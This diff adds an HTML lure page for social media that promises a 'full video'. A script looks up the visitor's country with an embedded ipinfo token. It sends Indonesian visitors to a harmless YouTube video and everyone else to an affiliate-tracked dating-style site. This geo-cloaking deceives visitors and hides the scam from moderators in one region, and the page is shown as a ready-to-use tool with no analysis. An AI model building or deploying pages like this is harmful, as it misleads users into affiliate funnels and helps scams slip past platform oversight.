@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>I just wanna be good for you</title>
+
+  <!-- Open Graph Meta Tags (untuk Threads, WhatsApp, Facebook) -->
+  <meta property="og:title" content="I just wanna be good for you" />
+  <meta property="og:description" content="Click to watch the full video now." />
+  <meta property="og:image" content="https://i.postimg.cc/fbGWF2wM/Gq19-M4-NWw-AQq-QJe.jpg" />
+  <meta property="og:url" content="https://yourusername.github.io/redirect-test/" />
+  <meta property="og:type" content="website" />
+
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Redirecting...</h1>
+  <p>Please wait while we take you to the content.</p>
+
+  <script>
+    async function getCountryCode() {
+      try {
+        const res = await fetch("https://ipinfo.io?token=5e9df460e83806");
+        const data = await res.json();
+        return data.country || "XX";
+      } catch (e) {
+        return "XX"; // fallback if fetch fails
+      }
+    }
+
+    (async () => {
+      const country = await getCountryCode();
+
+      if (country === "ID") {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      } else {
+        window.location.href = "https://exvlq.yourfandate.net/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=22010&s2=1127873&s3=ZORO&click_id=Alteam";
+      }
+    })();
+  </script>
+</body>
+</html>
